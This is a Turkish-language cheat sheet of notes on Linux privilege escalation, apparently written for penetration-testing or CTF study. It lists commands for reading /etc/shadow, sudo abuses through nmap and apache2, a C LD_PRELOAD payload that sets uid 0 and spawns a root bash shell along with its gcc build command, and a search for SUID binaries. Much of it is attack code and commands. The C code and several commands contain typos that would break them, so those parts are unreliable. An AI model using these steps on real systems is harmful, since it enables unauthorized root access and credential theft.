
**Bilgi Toplama**

(+)Faydalı notlar
    history: komutunu kullanarak bizden önceki kullanıcının bizden önce hangi komutları çalıştırdığını görebiliriz.
    ps aux : komutu sistemdeki işlemleri gösterir.
    chmod +x: yaptığımızda bir dosyayı çalışabilir hale getirir.

(+)Herhangi bir server dan shell olarak erişim sağlandığında bilgi toplamak için yapılması gerekenler.

    İşletim sistemi ismini ve version öğrenme için:
    -uname
    -cat /proc/version
    -cat /etc/issue
    Version bilgilerine göre o versiondaki açıklaları exploit etmeye çalışabiliriz.

(+)Password dosyalarına veya password geçen metinlere bakmak için:
    -cat /etc/password
    locate password
    find /password 2 > /devv/null
    -cat /etc/shadow
    Bakmaya çalışabiliriz

(+)Sudo açkları ile root olmak için:
 
    sudo -l yaparak root yetkili hangi dosyaları çalışabiliriz onlara bakabliriz.

    Örneğin nmap çalıştırabiliyorsak:

    nmap --interactive komutu ile shell açabiliriz.Açılan shellde !sh dersek root olabiliriz.

    Nmap yerine apacheserver çalıştırabiliyorsak eğer, 

    sudo filepath/apache2 -f /etc/shadow diyerek shadow içini görebiliriz.

    sudo -l yapınca Preload açığı nasıl exploit edilir.
    
    Bunun için birazda "c" programlama dili ile kod yazmamız gerekiyor.
    Yazdığımız c kodunu açtığımız shellde nano veya herhangi bir text editörü içine yazmamız gerekiyor.

    (+)"C" kodu ##C kodu ile shell açma 
        #inculude <stido.h>
        #inculude <sys/type.h>
        #inculude <stdlib.h>

        void _init()
        {
            unsetev("LD_PRELOAD")
            setgid(0);
            setuid(0);
            system("/bin/bash");
        }
    
    oluşturduğumuz dosyayı gcc ile çalıştırabilir hale getirmek için kullanılır.
    
    gcc -fPIC -shared -o /tmp/filename.so filename.c -nostartfiles
    yukarıdaki komut ile çalıştırabilir bir hale getiriyoruz.
    
    Daha sonra "sudo LD_PRELOAD=/tmp/filename.so nmap " nmap yerine sudo -l yapınca çıkan filepath deneyebiliriz.
    yukarıdaki kod ile Root oluyoruz.

(+)Suid açıkları
    find / -type f -perm -04000 -ls 2> /dev/null
    yukarıdaki komutu çalıştırdığımızda çıkan sonuç sol tarafdaki izinlerine bakmamız gerekiyor.
    Örneğin:/usr/local/bin/suid.so
    -rwsr gibi izinler görünce filepath çalıştırmaya çalıştırabiliriz.
    yapılan işlemleri takip eden "strace" adlı araçı kullabiliriz.

    Örneğin: strace /usr/local/bin/suid.so 2>&1 more
    








